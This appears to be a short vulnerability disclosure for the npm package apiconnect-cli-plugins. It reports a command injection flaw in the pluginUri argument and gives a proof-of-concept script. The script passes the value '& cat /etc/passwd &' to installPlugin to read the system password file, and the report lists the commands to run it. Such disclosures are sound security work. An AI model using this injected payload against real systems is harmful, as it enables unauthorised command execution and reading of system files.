# Description

`apiconnect-cli-plugins` is vulnerable to `Command Injection`. The argument pluginUri can be controlled by users without any sanitization.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var root = require("apiconnect-cli-plugins");
var payload = "& cat /etc/passwd &";
root.pluginLoader.installPlugin(payload,"");
```

2. Execute the following commands in another terminal:

```bash
npm i apiconnect-cli-plugins # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
It will show the contents of /etc/passwd
```
